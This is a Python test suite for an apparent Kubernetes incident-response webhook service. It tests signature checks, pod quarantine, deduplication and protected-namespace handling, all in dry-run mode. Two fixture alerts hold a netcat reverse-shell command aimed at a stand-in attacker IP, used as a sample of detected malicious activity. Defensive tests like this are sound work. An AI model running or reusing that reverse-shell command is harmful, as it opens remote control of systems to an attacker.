import hashlib
import hmac
import json
import os

# Set dry-run mode before importing main
os.environ["ZTRE_DRY_RUN"] = "true"
os.environ["ZTRE_WEBHOOK_SECRET"] = "test-secret"
os.environ["GEMINI_API_KEY"] = ""

from fastapi.testclient import TestClient
from main import app

client = TestClient(app)


def sign(payload_bytes: bytes, secret: str = "test-secret") -> str:
    sig = hmac.new(secret.encode(), payload_bytes, hashlib.sha256).hexdigest()
    return f"sha256={sig}"


def make_payload(namespace="modernized-app", pod_name="app-1", uid="uid-1"):
    return {
        "event_id": "evt-001",
        "timestamp": "2026-11-21T09:00:00Z",
        "policy_name": "detect-container-breakout",
        "workload": {
            "namespace": namespace,
            "pod_name": pod_name,
            "uid": uid,
            "labels": {"app": "modernized-app"},
        },
        "process": {
            "binary": "/bin/sh",
            "arguments": "-c 'nc -e /bin/sh 198.51.100.1 4444'",
            "parent_binary": "/usr/local/bin/php-fpm",
            "pid": 1234,
        },
    }


def test_healthz():
    resp = client.get("/healthz")
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "healthy"
    assert data["dry_run"] is True


def test_auth_rejection():
    payload = json.dumps(make_payload()).encode()
    # Missing header
    resp = client.post("/v1/remediate", content=payload)
    assert resp.status_code == 401

    # Invalid signature
    resp = client.post(
        "/v1/remediate",
        content=payload,
        headers={"X-ZTRE-Signature": "sha256=invalid"},
    )
    assert resp.status_code == 401


def test_quarantine_and_deduplication():
    payload_dict = make_payload(uid="unique-uid-99")
    payload = json.dumps(payload_dict).encode()
    headers = {"X-ZTRE-Signature": sign(payload)}

    # 1. Fresh alert -> Quarantined
    resp = client.post("/v1/remediate", content=payload, headers=headers)
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "quarantined"
    audit = data["audit_record"]
    assert audit["mode"] == "DRY_RUN"
    assert audit["applied_label"] == "ztre/quarantine=true"
    assert audit["network_policy"] == "ztre-zero-trust-quarantine"
    assert "[Deterministic Triage]" in audit["forensic_summary"]

    # 2. Duplicate alert (same UID) -> Deduplicated
    resp_dup = client.post("/v1/remediate", content=payload, headers=headers)
    assert resp_dup.status_code == 200
    assert resp_dup.json()["status"] == "deduplicated"


def test_protected_namespace_guardrail():
    payload_dict = make_payload(namespace="kube-system", uid="sys-uid-01")
    payload = json.dumps(payload_dict).encode()
    headers = {"X-ZTRE-Signature": sign(payload)}

    resp = client.post("/v1/remediate", content=payload, headers=headers)
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "ignored"
    assert data["reason"] == "protected_namespace"


def make_agent_alert(namespace="ztre-test", pod_name="vulnerable-web-abc", event_id="vuln-web-abc-1234"):
    return {
        "event_id": event_id,
        "timestamp": "2026-11-21T09:00:00Z",
        "pod_name": pod_name,
        "namespace": namespace,
        "parent_binary": "/usr/local/bin/vulnerable-web",
        "binary": "/bin/sh",
        "arguments": "-c nc -e /bin/sh 198.51.100.1 4444",
        "classification": "ANOMALOUS",
        "severity_score": 100.0,
        "context_score": 100.0,
        "asset_score": 25.0,
        "total_risk_score": 80.0,
        "action": "AUTO_CONTAINMENT",
        "recommended_action": "Immediate pod network containment triggered.",
    }


def test_agent_alert():
    payload = json.dumps(make_agent_alert(event_id="agent-evt-01")).encode()

    # No HMAC needed
    resp = client.post("/v1/agent-alert", content=payload)
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "acknowledged"
    audit = data["audit_record"]
    assert audit["mode"] == "AGENT_WEBHOOK"
    assert audit["netpol_status"] == "agent_handled"
    assert "[Deterministic Triage]" in audit["forensic_summary"]

    # Dedup
    resp2 = client.post("/v1/agent-alert", content=payload)
    assert resp2.json()["status"] == "deduplicated"


def test_agent_alert_protected_ns():
    payload = json.dumps(make_agent_alert(namespace="kube-system", event_id="agent-sys-01")).encode()
    resp = client.post("/v1/agent-alert", content=payload)
    assert resp.status_code == 200
    assert resp.json()["status"] == "ignored"


if __name__ == "__main__":
    test_healthz()
    test_auth_rejection()
    test_quarantine_and_deduplication()
    test_protected_namespace_guardrail()
    test_agent_alert()
    test_agent_alert_protected_ns()
    print("All tests passed successfully.")
